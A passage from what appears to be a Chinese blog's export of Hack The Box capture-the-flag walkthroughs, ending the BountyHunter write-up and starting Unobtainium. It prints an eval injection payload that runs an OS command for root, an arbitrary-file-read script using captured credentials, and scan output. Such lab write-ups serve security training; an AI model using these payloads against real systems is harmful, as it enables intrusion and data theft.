not startwith \"## Ticket to \" , Quit else Continue\n            if not x.startswith(\"## Ticket to \"):\n                return False\n            print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\")\n            continue\n\n    if x.startswith(\"__Ticket Code:__\"): # This is line number 2, as the previous statements are all returned out or continued to here. so line number 2 should be: \"__Ticket Code:__\"\n            code_line = i+1\n            continue\n\nif code_line and i == code_line: # if code_line exist\n            if not x.startswith(\"**\"): # if code_line not startwith **, Exit!\n                return False\n            ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] # Remove ** from Code Line, and split at pos 0 where + is found. example is: **102+, would become just 102\n            if int(ticketCode) % 7 == 4:  # the tricky part!\n                validationNumber = eval(x.replace(\"**\", \"\")) # this is confusing! that is the catch, the code does not eval the splitted ticketCode, but actually the line itself just without any **. so you should just pass a line of code that would work.\n```\né‚£å’±ä»¬ç¼–å†™ä¸€ä¸ª`.md`æ–‡ä»¶è®©ä»–æ»¡è¶³æ¡ä»¶å³å¯\n\n```Plain Text\n# Skytrain Inc\n## Ticket to\n__Ticket Code:__\n**102+ 10 == 112 and __import__('os').system('cat /root/root.txt') == False\n```\nå’±ä»¬è¿è¡Œä¸€ä¸‹\n\n```Plain Text\ndevelopment@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py\nPlease enter the path to the ticket file.\nlucifiel.md\nDestination:\nb320161d15bd03095cb66d05ac6d4ddf\nInvalid ticket.\n```\næˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Unobtainium - Hackthebox","url":"/2021/07/17/Hackthebox/Hard/Hackthebox-Unobtanium/","content":"\n# Hackthebox - Unobtainium\n# Hackthebox - Unobtainium é¶åœºå®æˆ˜\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Unobtanium/image1.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Unobtanium/image2.png)\n\n## ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.10.235\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 22:08 CST\nNmap scan report for 10.10.10.235\nHost is up (0.27s latency).\nNot shown: 65527 closed ports\nPORT      STATE SERVICE          VERSION\n22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)\n|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)\n|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)\n80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Unobtainium\n2379/tcp  open  ssl/etcd-client?\n| ssl-cert: Subject: commonName=unobtainium\n| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2021-01-17T07:10:30\n|_Not valid after:  2022-01-17T07:10:30\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  h2\n| tls-nextprotoneg:\n|_  h2\n2380/tcp  open  ssl/etcd-server?\n| ssl-cert: Subject: commonName=unobtainium\n| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2021-01-17T07:10:30\n|_Not valid after:  2022-01-17T07:10:30\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  h2\n| tls-nextprotoneg:\n|_  h2\n8443/tcp  open  ssl/https-alt\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.0 403 Forbidden\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39\n|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd\n|     Date: Thu, 15 Jul 2021 14:50:44 GMT\n|     Content-Length: 212\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   GenericLines:\n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest:\n|     HTTP/1.0 403 Forbidden\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39\n|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd\n|     Date: Thu, 15 Jul 2021 14:50:42 GMT\n|     Content-Length: 185\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   HTTPOptions:\n|     HTTP/1.0 403 Forbidden\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39\n|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd\n|     Date: Thu, 15 Jul 2021 14:50:43 GMT\n|     Content-Length: 189\n|_    {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|_http-title: Site doesn't have a title (application/json).\n| ssl-cert: Subject: commonName=minikube/organizationName=system:masters\n| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1\n| Not valid before: 2021-07-14T05:10:38\n|_Not valid after:  2022-07-15T05:10:38\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|   h2\n|_  http/1.1\n10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n| ssl-cert: Subject: commonName=unobtainium@1610865428\n| Subject Alternative Name: DNS:unobtainium\n| Not valid before: 2021-01-17T05:37:08\n|_Not valid after:  2022-01-17T05:37:08\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|   h2\n|_  http/1.1\n10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n31337/tcp open  http             Node.js Express framework\n| http-methods:\n|_  Potentially risky methods: PUT DELETE\n|_http-title: Site doesn't have a title (application/json; charset=utf-8).\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8443-TCP:V=7.91%T=SSL%I=7%D=7/15%Time=60F04857%P=x86_64-pc-linux-gn\nSF:u%r(GetRequest,1FF,\"HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-Control:\\x20\nSF:no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\nX-Content-\nSF:Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x203082aa7f\nSF:-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20c\nSF:4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x20Jul\\x2020\nSF:21\\x2014:50:42\\x20GMT\\r\\nContent-Length:\\x20185\\r\\n\\r\\n{\\\"kind\\\":\\\"Stat\nSF:us\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\":{},\\\"status\\\":\\\"Failure\\\",\\\"mes\nSF:sage\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"system:anonymous\\\\\\\"\\x20cannot\\x20ge\nSF:t\\x20path\\x20\\\\\\\"/\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"details\\\":{},\\\"code\nSF:\\\":403}\\n\")%r(HTTPOptions,203,\"HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-C\nSF:ontrol:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\\nSF:nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\\nSF:x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Priorityleve\nSF:l-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x\nSF:20Jul\\x202021\\x2014:50:43\\x20GMT\\r\\nContent-Length:\\x20189\\r\\n\\r\\n{\\\"ki\nSF:nd\\\":\\\"Status\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\":{},\\\"status\\\":\\\"Fail\nSF:ure\\\",\\\"message\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"system:anonymous\\\\\\\"\\x20c\nSF:annot\\x20options\\x20path\\x20\\\\\\\"/\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"deta\nSF:ils\\\":{},\\\"code\\\":403}\\n\")%r(FourOhFourRequest,21A,\"HTTP/1\\.0\\x20403\\x2\nSF:0Forbidden\\r\\nCache-Control:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x\nSF:20application/json\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernete\nSF:s-Pf-Flowschema-Uid:\\x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kuber\nSF:netes-Pf-Prioritylevel-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\n\nSF:Date:\\x20Thu,\\x2015\\x20Jul\\x202021\\x2014:50:44\\x20GMT\\r\\nContent-Length\nSF::\\x20212\\r\\n\\r\\n{\\\"kind\\\":\\\"Status\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\"\nSF::{},\\\"status\\\":\\\"Failure\\\",\\\"message\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"syst\nSF:em:anonymous\\\\\\\"\\x20cannot\\x20get\\x20path\\x20\\\\\\\"/nice\\x20ports,/Trinit\nSF:y\\.txt\\.bak\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"details\\\":{},\\\"code\\\":403}\nSF:\\n\")%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T\nSF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\nSF:\\x20Bad\\x20Request\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/15%OT=22%CT=1%CU=43753%PV=Y%DS=2%DC=T%G=Y%TM=60F048D\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   271.92 ms 10.10.14.1\n2   271.99 ms 10.10.10.235\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1914.83 seconds\n```\nä»ä¸Šé¢çš„æ‰«æç»“æœï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‡ ä¸ªå…³é”®ä¿¡æ¯ - æœ¬å°é¶æœºå¼€å¯äº†`22`ï¼Œ`80`ï¼Œ`2379`ï¼Œ`2380`ï¼Œ`8443`ï¼Œ`10250`ï¼Œ`10256`ï¼Œ`31337`ç«¯å£ - å…¶ä¸­`80`ï¼Œ`2379`ï¼Œ`2380`ï¼Œ`8443`ï¼Œ`10250`ï¼Œ`10256`ï¼Œ`31337`éƒ½æ˜¯httpæœåŠ¡ - `8443`ç«¯å£ç»™å‡ºäº†ä¸¤ä¸ªå…³é”®ä¿¡æ¯ `/nice` `/Trinity.txt.bak` - `31337`ç«¯å£å­˜åœ¨`PUT`å’Œ`DELETE`é£é™©\n\nå’±ä»¬å…ˆå»80ç«¯å£çœ‹çœ‹\n\n```Plain Text\nhttp://10.10.10.235/\n```\n![](Hackthebox-Unobtanium/image3.png)\n\nå®ƒå£°ç§°è¿™æ˜¯ä¸€ä¸ªèŠå¤©ç¨‹åºï¼Œå¹¶ç»™äº†ä¸‰ä¸ªä¸‹è½½åœ°å€ï¼Œå’±ä»¬ç»™å®ƒä¸‹è½½ä¸‹æ¥ï¼ŒåŒæ—¶FUZZä¸€ä¸‹ç›®å½•\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.10.235 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.235\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              txt,php,html\n[+] Timeout:                 10s\n===============================================================\n2021/07/16 16:33:21 Starting gobuster in directory enumeration mode\n===============================================================\n/.htpasswd.php        (Status: 403) [Size: 277]\n/.hta                 (Status: 403) [Size: 277]\n/.htaccess            (Status: 403) [Size: 277]\n/.htpasswd.html       (Status: 403) [Size: 277]\n/.hta.txt             (Status: 403) [Size: 277]\n/.htaccess.php        (Status: 403) [Size: 277]\n/.htpasswd.txt        (Status: 403) [Size: 277]\n/.hta.php             (Status: 403) [Size: 277]\n/.htaccess.html       (Status: 403) [Size: 277]\n/.htaccess.txt        (Status: 403) [Size: 277]\n/.htpasswd            (Status: 403) [Size: 277]\n/.hta.html            (Status: 403) [Size: 277]\n/LICENSE.txt          (Status: 200) [Size: 17128]\n/README.txt           (Status: 200) [Size: 711]\n/assets               (Status: 301) [Size: 313] [--> http://10.10.10.235/assets/]\n/downloads            (Status: 301) [Size: 316] [--> http://10.10.10.235/downloads/]\n/index.html           (Status: 200) [Size: 1988]\n/index.html           (Status: 200) [Size: 1988]\n/images               (Status: 301) [Size: 313] [--> http://10.10.10.235/images/]\n/server-status        (Status: 403) [Size: 277]\n\n===============================================================\n2021/07/16 16:33:58 Finished\n===============================================================\n```\nå½“fuzzå®Œçš„æ—¶å€™ï¼Œä¸‰ä¸ªæ–‡ä»¶ä¹Ÿä¸‹è½½å®Œäº†ï¼Œå’±ä»¬å»çœ‹ä¸€ä¸‹\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Downloads]\nâ””â”€# ls\nunobtainium_debian.zip  unobtainium_redhat.zip  unobtainium_snap.zip\n```\nè®©æˆ‘ä»¬æå–debåŒ…ä¸­çš„æ–‡ä»¶ï¼Œè€Œä¸å®‰è£…å®ƒ\n\n```Plain Text\nmkdir test\nunzip unobtainium_debian.zip\ndpkg-deb -xv unobtainium_1.0.0_amd64.deb test\ncd test\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Downloads/test]\nâ””â”€# tree\n.\nâ”œâ”€â”€ opt\nâ”‚Â Â  â””â”€â”€ unobtainium\nâ”‚Â Â      â”œâ”€â”€ chrome_100_percent.pak\nâ”‚Â Â      â”œâ”€â”€ chrome_200_percent.pak\nâ”‚Â Â      â”œâ”€â”€ chrome-sandbox\nâ”‚Â Â      â”œâ”€â”€ icudtl.dat\nâ”‚Â Â      â”œâ”€â”€ libEGL.so\nâ”‚Â Â      â”œâ”€â”€ libffmpeg.so\nâ”‚Â Â      â”œâ”€â”€ libGLESv2.so\nâ”‚Â Â      â”œâ”€â”€ libvk_swiftshader.so\nâ”‚Â Â      â”œâ”€â”€ libvulkan.so\nâ”‚Â Â      â”œâ”€â”€ LICENSE.electron.txt\nâ”‚Â Â      â”œâ”€â”€ LICENSES.chromium.html\nâ”‚Â Â      â”œâ”€â”€ locales\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ am.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ar.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ bg.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ bn.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ca.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ cs.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ da.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ de.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ el.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ en-GB.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ en-US.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ es-419.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ es.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ et.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ fa.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ fil.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ fi.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ fr.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ gu.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ he.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ hi.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ hr.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ hu.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ id.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ it.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ja.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ kn.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ko.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ lt.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ lv.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ml.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ mr.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ms.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ nb.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ nl.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ pl.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ pt-BR.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ pt-PT.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ro.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ru.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ sk.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ sl.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ sr.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ sv.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ sw.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ ta.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ te.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ th.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ tr.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ uk.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ vi.pak\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ zh-CN.pak\nâ”‚Â Â      â”‚Â Â  â””â”€â”€ zh-TW.pak\nâ”‚Â Â      â”œâ”€â”€ resources\nâ”‚Â Â      â”‚Â Â  â””â”€â”€ app.asar\nâ”‚Â Â      â”œâ”€â”€ resources.pak\nâ”‚Â Â      â”œâ”€â”€ snapshot_blob.bin\nâ”‚Â Â      â”œâ”€â”€ swiftshader\nâ”‚Â Â      â”‚Â Â  â”œâ”€â”€ libEGL.so\nâ”‚Â Â      â”‚Â Â  â””â”€â”€ libGLESv2.so\nâ”‚Â Â      â”œâ”€â”€ unobtainium\nâ”‚Â Â      â”œâ”€â”€ v8_context_snapshot.bin\nâ”‚Â Â      â””â”€â”€ vk_swiftshader_icd.json\nâ””â”€â”€ usr\n    â””â”€â”€ share\n        â”œâ”€â”€ applications\n        â”‚Â Â  â””â”€â”€ unobtainium.desktop\n        â”œâ”€â”€ doc\n        â”‚Â Â  â””â”€â”€ unobtainium\n        â”‚Â Â      â””â”€â”€ changelog.gz\n        â””â”€â”€ icons\n            â””â”€â”€ hicolor\n                â”œâ”€â”€ 128x128\n                â”‚Â Â  â””â”€â”€ apps\n                â”‚Â Â      â””â”€â”€ unobtainium.png\n                â”œâ”€â”€ 16x16\n                â”‚Â Â  â””â”€â”€ apps\n                â”‚Â Â      â””â”€â”€ unobtainium.png\n                â”œâ”€â”€ 256x256\n                â”‚Â Â  â””â”€â”€ apps\n                â”‚Â Â      â””â”€â”€ unobtainium.png\n                â”œâ”€â”€ 32x32\n                â”‚Â Â  â””â”€â”€ apps\n                â”‚Â Â      â””â”€â”€ unobtainium.png\n                â”œâ”€â”€ 48x48\n                â”‚Â Â  â””â”€â”€ apps\n                â”‚Â Â      â””â”€â”€ unobtainium.png\n                â””â”€â”€ 64x64\n                    â””â”€â”€ apps\n                        â””â”€â”€ unobtainium.png\n\n24 directories, 80 files\n```\nåœ¨`/test/opt/unobtainium`ä¸­ï¼Œæœ‰ä¸€ä¸ªåä¸º`unobtainium`çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè®©æˆ‘ä»¬æ‰§è¡Œå®ƒ\n\n```Plain Text\n./unobtainium --no-sandbox\n```\nå¾—åˆ°äº†é”™è¯¯\n\n![](Hackthebox-Unobtanium/image4.png)\n\nè®©æˆ‘ä»¬æ·»åŠ ä¸€ä¸‹åŸŸå\n\n```Plain Text\necho 10.10.10.235 unobtainium.htb >> /etc/hosts\n```\nç„¶åå†æ‰§è¡Œä¸€æ¬¡\n\nè¿™æ¬¡è¿è¡Œæ­£å¸¸äº†\n\nå½“æˆ‘ä½¿ç”¨`Wireshark`ç›‘å¬tun0çš„æ—¶å€™ï¼Œåœ¨`Unobtainium Chat`ä¸­ç‚¹å‡»`Todo`å³å¯æ•æ‰åˆ°æµé‡åŒ…\n\n```Plain Text\nPOST /todo HTTP/1.1\nHost: unobtainium.htb:31337\nConnection: keep-alive\nContent-Length: 73\nAccept: application/json, text/javascript, */*; q=0.01\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN\n\n{\"auth\":{\"name\":\"felamos\",\"password\":\"Winter2021\"},\"filename\":\"todo.txt\"}HTTP/1.1 200 OK\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 293\nETag: W/\"125-tNs2+nU0UiQGmLreBy4Pj891aVA\"\nDate: Fri, 16 Jul 2021 09:49:16 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{\"ok\":true,\"content\":\"1. Create administrator zone.\\n2. Update node JS API Server.\\n3. Add Login functionality.\\n4. Complete Get Messages feature.\\n5. Complete ToDo feature.\\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\\n7. Improve security\\n\"}\n```\nä¼¼ä¹Todoå‡½æ•°å…·æœ‰ä»æœåŠ¡å™¨è¯»å–æ–‡ä»¶çš„èƒ½åŠ›ã€‚\n\næˆ‘æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬æ¥æ£€æŸ¥æ˜¯å¦å¯ä»¥ä»æœåŠ¡å™¨è¯»å–æ–‡ä»¶ã€‚\n\næˆ‘è¿˜è¿è¡Œäº†Burpæ¥æ•è·è¯·æ±‚ ## æ¼æ´åˆ©ç”¨ åœ¨è¿è¡Œè„šæœ¬ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…éœ€è¦çš„ç¯å¢ƒ\n\n```Plain Text\napt-get install jq\n```\n```Plain Text\n#!/bin/bash\n\nRHOST=\"unobtainium.htb\"\nRPORT=31337\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nFILE=$1\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"${FILE}\"\n}\nEOF\n\nCONTENT=\"$(curl -s \\\n                -A \"${UA}\" \\\n                -H \"Content-Type: application/json\" \\\n                -d \"$(cat message.json | jq -c)\" \\\n                -x \"${PROXY}\" \\\n                http://${RHOST}:${RPORT}/todo \\\n           | jq .content \\\n           | sed -e 's/^.//' -e 's/.$//')\"\n\nprintf \"$CONTENT\"\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ./read.sh\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"\"\n}\n\n```\nå’±ä»¬ä½¿ç”¨burpæ•æ‰ä¸€ä¸‹æµé‡è¯•è¯•\n\n![](Hackthebox-Unobtanium/image5.png)\n\næˆåŠŸè®©æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\n```Plain Text\nindex.js\n```\nçš„å†…å®¹\n\n![](Hackthebox-Unobtanium/image6.png)\n\n```Plain Text\n{\"ok\":true,\"content\":\"var root = require(\\\"google-cloudstorage-commands\\\");\\nconst express = require('express');\\nconst { exec } = require(\\\"child_process\\\");     \\nconst bodyParser = require('body-parser');     \\nconst _ = require('lodash');                                                                  \\nconst app = express();\\nvar fs = require('fs');\\n                                                                                              \\nconst users = [                                                                               \\n  {name: 'felamos', password: 'Winter2021'},\\n  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      \\n];\\n\\nlet messages = [];                             \\nlet lastId = 1;                                \\n                                                                                              \\nfunction findUser(auth) {                                                                     \\n  return users.find((u) =>                                                                    \\n    u.name === auth.name &&                                                                   \\n    u.password === auth.password);                                                            \\n}                                    \\n                                               \\napp.use(bodyParser.json());                                                                   \\n                                               \\napp.get('/', (req, res) => {                   \\n  res.send(messages);                                                                         \\n});                                                                                           \\n                                                                                              \\napp.put('/', (req, res) => {   \\n  const user = findUser(req.body.auth || {});                                                 \\n                                               \\n  if (!user) {                                 \\n    res.status(403).send({ok: false, error: 'Access denied'});                                \\n    return;\\n  }\\n\\n  const message = {\\n    icon: '__',\\n  };\\n\\n  _.merge(message, req.body.message, {\\n    id: lastId++,\\n    timestamp: Date.now(),\\n    userName: user.name,\\n  });\\n\\n  messages.push(message);\\n  res.send({ok: true});\\n});\\n\\napp.delete('/', (req, res) => {\\n  const user = findUser(req.body.auth || {});\\n\\n  if (!user || !user.canDelete) {\\n    res.status(403).send({ok: false, error: 'Access denied'});\\n    return;\\n  }\\n\\n  messages = messages.filter((m) => m.id !== req.body.messageId);\\n  res.send({ok: 